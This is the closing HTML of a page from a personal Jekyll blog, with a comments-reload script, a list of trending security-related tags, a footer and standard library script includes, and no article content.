loaded */ if (typeof DISQUS === 'undefined') { return; } if (document.readyState == 'complete') { DISQUS.reset({ reload: true, config: disqus_config }); } } } if (document.querySelector('.mode-toggle')) { window.addEventListener('message', reloadDisqus); } </script></div></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/smbclient/">smbclient</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/cve/">cve</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a> <a class="post-tag" href="/tags/smbmap/">smbmap</a> <a class="post-tag" href="/tags/active-directory/">Active Directory</a> <a class="post-tag" href="/tags/hashcat/">hashcat</a> <a class="post-tag" href="/tags/impacket-mssqlclient/">impacket-mssqlclient</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><footer><div class="container pl-lg-4 pr-lg-4"><div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://twitter.com/username">Niraj Maharjan</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0">Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></div></footer><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lazysizes@5.3.2/lazysizes.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
